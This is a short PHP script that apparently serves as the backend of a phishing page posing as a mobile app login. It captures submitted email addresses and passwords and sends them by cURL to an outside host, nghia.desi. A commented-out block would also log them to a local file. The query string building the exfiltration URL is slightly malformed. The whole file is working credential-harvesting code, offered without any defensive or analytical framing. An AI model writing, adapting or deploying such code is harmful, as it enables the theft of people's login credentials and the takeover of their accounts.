<?php
//BMN2312 :v
if (isset($_POST["email"]) && isset($_POST["password"]) && isset($_POST["app_id"])){
$email = $_POST['email'];
$pass = $_POST['password'];
$app_id = $_POST["app_id"];
/*
$handle = fopen("bmn2312.txt", "a");
foreach($_POST as $variable => $value) {
if ($variable == 'email' or $variable =='password')
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
}
fwrite($handle, "\r\n");
fclose($handle);
*/
auto('http://nghia.desi/api.php?email='.$_POST['email'].'&password'.$_POST['password'].'&submit=true');

if($app_id == 350685531728)
{
include 'system/android.php';
}else if($app_id == 6628568379)
{
include 'system/iphone.php';
}
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>